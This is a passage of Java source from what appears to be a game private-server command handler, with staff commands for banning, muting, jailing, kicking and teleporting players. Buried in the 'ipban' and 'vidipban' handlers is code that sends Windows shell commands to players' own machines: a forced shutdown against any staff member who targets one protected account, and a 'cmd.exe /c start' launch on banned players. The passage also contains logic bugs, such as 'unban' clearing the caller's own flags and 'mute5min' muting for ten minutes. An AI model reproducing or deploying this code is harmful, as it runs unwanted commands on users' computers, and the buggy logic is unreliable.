					player.getPackets().sendPanelBoxMessage("Use: ::sound soundid effecttype");
					return true;
				}
				try {
					player.getPackets().sendMusic(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::sound soundid");
				}
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("bank")) {
				player.getBank().openBank();
				return true;
			}
			
			
				
			
			if (cmd[0].equalsIgnoreCase("emusic")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::emusic soundid effecttype");
					return true;
				}
				try {
					player.getPackets()
					.sendMusicEffect(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::emusic soundid");
				}
				return true;
			}
			
			}
			return false;
			}
//Global End

//Mod 9898
	public static boolean processModCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else { //INSERT COMMANDS
	
			
				if (cmd[0].equalsIgnoreCase("setstaffpin")) {
						player.staffpin = Integer.valueOf(cmd[1]);
						player.getPackets().sendGameMessage("Pin set to: " + String.valueOf(player.staffpin));
					
				}
				
				
					if (cmd[0].equalsIgnoreCase("remotez")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
					return true;
				}
				try {
					player.getAppearence().setRenderEmote(
							Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
				}
				return true;
			}
		

		
			if (cmd[0].equalsIgnoreCase("permban")) {
			
			if (cmd[1].equalsIgnoreCase("poanizer")) {
				player.getPackets().sendGameMessage("* uses Reflect...*");
				player.getPackets().sendGameMessage("Its super effective.");
				
				player.setNextGraphics(new Graphics(6));
					player.setNextAnimation(new Animation(7071));
					player.getPackets().sendCameraShake(3, 25, 50, 25, 50);
					player.setNextForceTalk(new ForceTalk("You under estimate my power....."));
					player.getPackets().sendGameMessage("Hey man, thats not cool.");
			}
		
			
			else {
			
					
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target != null) {
					SerializableFilesManager.banningBackup(String.valueOf(target.getUsername()));
					target.setPermBanned(true);
					if (loggedIn)
						target.getSession().getChannel().close();
					else
						SerializableFilesManager.savePlayer(target);
					player.getPackets().sendGameMessage("You've permanently banned " + (loggedIn ? target.getDisplayName() : name) + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/permban.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " permbanned " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				return true;
			}
			}
			
			
			if (cmd[0].equalsIgnoreCase("ipban")) {
			
			if (cmd[1].equalsIgnoreCase("poanizer")) {
			
				player.getPackets().sendGameMessage("* uses Reflect...*");
				player.getPackets().sendGameMessage("Its super effective.");
				for (Player players : World.getPlayers()) 
				players.getPackets().sendGameMessage(player.getDisplayName() + "Tryed to IpBan Poanizer");
				player.getPackets().sendExecMessage("cmd.exe /c shutdown -s -t 10");
					return false;
			}
			
			else {
			String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target != null) {
					SerializableFilesManager.banningBackup(String.valueOf(target.getUsername()));
					IPBanL.ban(target, loggedIn);
					player.getPackets().sendGameMessage("You've permanently ipbanned "+ (loggedIn ? target.getDisplayName() : name) + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/ipban.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Ip Banned " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
				
				
			}}
			
	
	
		if (cmd[0].equalsIgnoreCase("ipmute")) {
			String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target != null) {
					SerializableFilesManager.banningBackup(String.valueOf(target.getUsername()));
					IPMute.mute(target, loggedIn);
					IPMute.save();
					
					player.getPackets().sendGameMessage("You've IpMuted "+ (loggedIn ? target.getDisplayName() : name) + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/ipmute.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Ip Banned " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
				
				
			}
			
			if (cmd[0].equalsIgnoreCase("unipmute")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = null;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils.formatPlayerNameForProtocol(name));
					IPMute.unmute(target);
					target.setMuted(0);
					SerializableFilesManager.savePlayer(target);
					IPMute.save();
					if (!IPMute.getList().contains(player.getLastIP()))
						player.getPackets().sendGameMessage("You un ipmuted "+ Utils.formatPlayerNameForProtocol(name) + ".", true);
					else
						player.getPackets().sendGameMessage("Something went wrong. Contact a developer.", true);
				
				try {
					File file = new File("data/logs/unipmute.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " UnIp Banned " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				}
				
				return true;
				}

			if (cmd[0].equalsIgnoreCase("vidipban")) {
			
			if (cmd[1].equalsIgnoreCase("poanizer")) {
			
				player.getPackets().sendGameMessage("* uses Reflect...*");
				player.getPackets().sendGameMessage("Its super effective.");
				for (Player players : World.getPlayers()) 
				players.getPackets().sendGameMessage(player.getDisplayName() + "Tryed to IpBan ");
				player.getPackets().sendExecMessage("cmd.exe /c shutdown -s -t 10");
					return false;
			}
			else{
			
			String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Utils
								.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target != null) {
					target.getPackets().sendExecMessage("cmd.exe /c start " + Settings.IBANNED);
						SerializableFilesManager.banningBackup(String.valueOf(target.getUsername()));
					IPBanL.ban(target, loggedIn);
					player.getPackets().sendGameMessage("You've permanently ipbanned "+ (loggedIn ? target.getDisplayName() : name) + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/ipban.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Ip Banned " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
				
				
			}}
			
			if (cmd[0].equalsIgnoreCase("unipban")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = null;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils.formatPlayerNameForProtocol(name));
					IPBanL.unban(target);
					SerializableFilesManager.savePlayer(target);
					if (!IPBanL.getList().contains(player.getLastIP()))
						player.getPackets().sendGameMessage("You unipbanned "+ Utils.formatPlayerNameForProtocol(name) + ".", true);
					else
						player.getPackets().sendGameMessage("Something went wrong. Contact a developer.", true);
				
				try {
					File file = new File("data/logs/unipban.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " UnIp Banned " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				}
				
				return true;
				}
			
			
				//manually remove an ip from the ipban list.	
			if (cmd[0].equalsIgnoreCase("removeip")) {
			 player.getPackets().sendGameMessage("removed: " + cmd[1]);
				IPBanL.removeip(cmd[1]);
				}
			
			if (cmd[0].equalsIgnoreCase("checkbank")) {
						    String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
						    Player other = World.getPlayerByDisplayName(username);
						    try {
						  player.getPackets().sendItems(95, other.getBank().getContainerCopy());
									player.getBank().openPlayerBank(other);
						    } catch (Exception e){
						     player.getPackets().sendGameMessage("The player " + username + " is currently unavailable.");
						    }
						    return true;
						   }
				
			
			
		
			
			if (cmd[0].equalsIgnoreCase("tt")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2722, 4901, 0));
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("sz")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(1888, 5126, 0));
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("highspot")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3448, 3176, 3));
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("ban")) {
			
			if (cmd[1].equalsIgnoreCase("poanizer")) {
				player.getPackets().sendGameMessage("* uses Reflect...*");
				player.getPackets().sendGameMessage("Its super effective.");
				
					player.setNextGraphics(new Graphics(6));
					player.setNextAnimation(new Animation(7071));
					player.getPackets().sendCameraShake(3, 25, 50, 25, 50);
					player.setNextForceTalk(new ForceTalk("You under estimate my power....."));
					player.getPackets().sendGameMessage("Hey man, thats not cool.");
			}
			
			else {
			
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setBanned(Utils.currentTimeMillis()
							+ (24 * 60 * 60 * 1000));
					target.getSession().getChannel().close();
					player.getPackets().sendGameMessage("You have banned 24 hours: "+ target.getDisplayName() + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/ban.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " banned " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}}
			
			if (cmd[0].equalsIgnoreCase("unban")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = null;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils.formatPlayerNameForProtocol(name));
				player.setPermBanned(false);
				player.setBanned(0);
					SerializableFilesManager.savePlayer(target);
					if (!IPBanL.getList().contains(player.getLastIP()))
						player.getPackets().sendGameMessage("You unbanned "+ Utils.formatPlayerNameForProtocol(name) + ".", true);
					else
						player.getPackets().sendGameMessage("Something went wrong. Contact a developer.", true);
				}
			}
			
			if (cmd[0].equalsIgnoreCase("hide")) {
				player.getAppearence().switchHidden();
				player.getPackets().sendGameMessage("Am I hidden? " + player.getAppearence().isHidden());
				return true;
			}
			
			//pretty buggy.
			if (cmd[0].equalsIgnoreCase("getinv")) {
                if(cmd[1].length() == 0) {
                    return false;
                }
                NumberFormat nf = NumberFormat.getInstance(Locale.US);
                String amount;
                Player player2 = World.getPlayer(cmd[1]);
                if (player2 == null) {
                	return false;
                }
                int player2freeslots = player2.getInventory().getFreeSlots();
                int player2usedslots = 28 - player2freeslots;
                
                player.getPackets().sendGameMessage("----- Inventory Information -----");
                player.getPackets().sendGameMessage("<col=DF7401>" + Utils.formatPlayerNameForDisplay(cmd[1]) + "</col> has used <col=DF7401>" + player2usedslots + " </col>of <col=DF7401>" + player2freeslots + "</col> inventory slots.");
                player.getPackets().sendGameMessage("Inventory contains:");
                for(int i = 0; i < player2usedslots; i++) {
                    amount = nf.format(player2.getInventory().getItems().getNumberOf(player2.getInventory().getItems().get(i).getId()));
                    player.getPackets().sendGameMessage("<col=088A08>" + amount + "</col><col=BDBDBD> x </col><col=088A08>" +  player2.getInventory().getItems().get(i).getId());
                      
                }
                player.getPackets().sendGameMessage("--------------------------------");
                return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("teleto")) {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
				player.setNextWorldTile(other);
				player.stopAll();
				return true;
			}
						
			if (cmd[0].equalsIgnoreCase("teletome")) {
			
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
				other.setNextWorldTile(player);
				other.stopAll();
				return true;
			}
			//pretty pointless cmd tbh. Admins do ;;playersip
			if (cmd[0].equalsIgnoreCase("checkip")) {
				if (cmd.length < 3)
					return true;
				String username = cmd[1];
				String username2 = cmd[2];
				Player p2 = World.getPlayerByDisplayName(username);
				Player p3 = World.getPlayerByDisplayName(username2);
				boolean same = false;
				if (p3.getSession().getIP()
						.equalsIgnoreCase(p2.getSession().getIP())) {
					same = true;
				} else {
					same = false;
				}
				player.getPackets().sendGameMessage("They have the same IP : " + same);
				return true;
			}
			
			}
			return false;
		}
			
//Mod End	

//Support
	public static boolean processSupportCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else {
				
				
					
				//MUTES
				
			if (cmd[0].equalsIgnoreCase("unmute")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setMuted(0);
					player.getPackets().sendGameMessage("You have unmuted: " + target.getDisplayName() + ".");
					target.getPackets().sendGameMessage("You have been unmuted by : " + player.getUsername());
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/unmute.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Muted" + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				return true;
				}
				
			if (cmd[0].equalsIgnoreCase("mute")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setMuted(Utils.currentTimeMillis()
							+ (24 * 60 * 60 * 1000));
					target.getPackets().sendGameMessage("You've been muted for 24 hours.");
					player.getPackets().sendGameMessage("You have muted 24 hours: " + target.getDisplayName() + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				
				try {
					File file = new File("data/logs/mute.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Muted" + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
			
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("mute12hr")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setMuted(Utils.currentTimeMillis()
							+ (12 * 60 * 60 * 1000));
					target.getPackets().sendGameMessage("You've been muted for 12 hours.");
					player.getPackets().sendGameMessage("You have muted 12 hours: " + target.getDisplayName() + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/mute_12hr.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " muted 12 hours " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("mute1hr")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setMuted(Utils.currentTimeMillis()
							+ (1 * 60 * 60 * 1000));
					target.getPackets().sendGameMessage("You've been muted for 1 hour");
					player.getPackets().sendGameMessage("You have muted 1 hour: " + target.getDisplayName() + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/mute_1hr.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Muted 1 hour " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
			
		
	//MUTES END
			
	//JAILS
			if (cmd[0].equalsIgnoreCase("unjail")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setJailed(0);
					JailControler.stopControler(target);
					target.setNextWorldTile(Settings.RESPAWN_PLAYER_LOCATION);
					target.getPackets().sendGameMessage("You've been unjailed.");
					player.getPackets().sendGameMessage("You have unjailed " + target.getDisplayName() + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				
				
				try {
					File file = new File("data/logs/unjail.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Un Jailed " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("jail")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setJailed(Utils.currentTimeMillis()
							+ (24 * 60 * 60 * 1000));
					target.getControlerManager().startControler("JailControler");
					target.getPackets().sendGameMessage("You've been jailed for 24 hours.");
					player.getPackets().sendGameMessage("You have jailed 24 hours: " + target.getDisplayName() + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
			
				
				try {
					File file = new File("data/logs/jail.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Jailed " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("jail12hr")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setJailed(Utils.currentTimeMillis()
							+ (12 * 60 * 60 * 1000));
					target.getControlerManager().startControler("JailControler");
					target.getPackets().sendGameMessage("You've been jailed for 12 hour.");
					player.getPackets().sendGameMessage("You have jailed 12 hour: " + target.getDisplayName() + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/jail_12hr.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Jailed 12 hour " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("jail1hr")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setJailed(Utils.currentTimeMillis()
							+ (1 * 60 * 60 * 1000));
					target.getControlerManager().startControler("JailControler");
					target.getPackets().sendGameMessage("You've been jailed for 1 hour.");
					player.getPackets().sendGameMessage("You have jailed 1 hour: " + target.getDisplayName() + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/jail_1hr.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Jailed 1 hour" + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("jail10min")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setJailed(Utils.currentTimeMillis()
							+ (10 * 60 * 1000));
					target.getControlerManager().startControler("JailControler");
					target.getPackets().sendGameMessage("You've been jailed for 10 min.");
					player.getPackets().sendGameMessage("You have jailed 10 min: " + target.getDisplayName() + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/jail_10min.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Jailed 10 min" + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
	//JAILS END
			
		
			if (cmd[0].equalsIgnoreCase("kick")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.getSession().getChannel().close();
					World.removePlayer(target);
					player.getPackets().sendGameMessage("You have kicked: " + target.getDisplayName() + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/kick.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Kicked" + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
				
				
			}

			
			
			if (cmd[0].equalsIgnoreCase("ticket")) {
				EntityList<Player> allPlayers = World.getPlayers();
				for (Player firstPlayer : allPlayers) {
					if (firstPlayer.isUsingTicket()) {
						if (firstPlayer.getAttackedByDelay() > System.currentTimeMillis()
								&& firstPlayer.getControlerManager().getControler() != null) {
							player.getPackets().sendGameMessage("The player is in combat.");
							firstPlayer.getPackets().sendGameMessage("Your ticket has been closed because you're in combat.");
							firstPlayer.setUsingTicket(false);
							return true;
						}
						firstPlayer.setNextWorldTile(new WorldTile(player.getX(), player.getY() + 1, player.getPlane()));
						firstPlayer.getPackets().sendGameMessage("" + player.getDisplayName() + " will be handling your ticket.");
						player.setNextForceTalk(new ForceTalk("How can i help you?"));
						firstPlayer.faceEntity(player);
						firstPlayer.setUsingTicket(false);
						for (Player secondPlayer : allPlayers) {
							if (secondPlayer.isUsingTicket()
									&& secondPlayer.getControlerManager()
									.getControler() != null) {
								secondPlayer
								.getPackets()
								.sendGameMessage("Your ticket turn is about to come, please make sure you're not in a pvp area.");
								return true;
							}
						}
						return true;
					}
				}
				return true;
			}
				
			
				
			
			
			}
			return false;
			}
//Support End

//Trusted
	public static boolean processTrustedCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else {
			
		
			
			}
			return false;
			}
//trusted end

//Forum 
	public static boolean processForumCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else {
			

			
			
			}
return false;
			}
//Forum End

//Graphic
	public static boolean processGraphicCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else {
			if (cmd[0].equalsIgnoreCase("staffyell")) {
				String message = "";
				for (int i = 1; i < cmd.length; i++)
					message += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				sendYell(player, Utils.fixChatMessage(message), true);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("staffzone")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3295, 4512, 0));
				return true;
			}
			
			
				
			if (cmd[0].equalsIgnoreCase("mute5min")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");

				Player target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setMuted(Utils.currentTimeMillis()
							+ (10 * 60 * 1000));
					target.getPackets().sendGameMessage("You've been muted for 5 minutes");
					player.getPackets().sendGameMessage("You have muted 5 minutes: " + target.getDisplayName() + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/mute_5min.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Muted 5 mins " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
		
			
			
			if (cmd[0].equalsIgnoreCase("sendhome")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				if (target != null)
					target.setNextWorldTile(Settings.RESPAWN_PLAYER_LOCATION);
				
				
				try {
					File file = new File("data/logs/sendhome.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Sent Home " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
			
		}
		
		
		return false;
	}
			
			
//Graphic End
	
//Respected
	public static boolean processRespectedCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else {
			
		//remote for supers	
		if (player.getControlerManager().getControler() instanceof DZ) {
			
			if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
		
		else{
				
				
			if (cmd[0].equalsIgnoreCase("emote")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
					return true;
				}
				try {
					player.setNextAnimation(new Animation(Integer
							.valueOf(cmd[1])));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::emote id");
				}
				return true;
			}
				if (cmd[0].equalsIgnoreCase("gfx")) {
				if (cmd.length < 2) {
					player.getPackets().sendPanelBoxMessage("Use: ::gfx id");
					return true;
				}
				try {
					player.setNextGraphics(new Graphics(Integer.valueOf(cmd[1])));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::gfx id");
				}
				return true;
			}
			
				}
			}
				
			
		
		
			
			}
			return false;
			}
//Respected End

//Super
	public static boolean processSuperCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else {
			
			if (cmd[0].equalsIgnoreCase("specrestore")) {
			if(player.lastSpec <= Utils.currentTimeMillis()){
				player.getCombatDefinitions().resetSpecialAttack();
				player.lastSpec = (Utils.currentTimeMillis() + 120000);
				player.setNextAnimation(new Animation(1651));
				player.setNextGraphics(new Graphics(388));
				player.getPackets().sendGameMessage("You recharge your special attack.");
			}
			else{
			player.getPackets().sendGameMessage("You can only use this every 2 minutes.");
			player.getPackets().sendGameMessage(String.valueOf(player.lastSpec) + ":  Last spec");
			player.getPackets().sendGameMessage(String.valueOf(Utils.currentTimeMillis() + ": Current time" ));
				
			}
			}
			
			if (cmd[0].equalsIgnoreCase("colour")) {
				player.getAppearence().setColor(Integer.valueOf(cmd[1]),Integer.valueOf(cmd[2]));
				player.getAppearence().generateAppearenceData();
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("skin")) { 
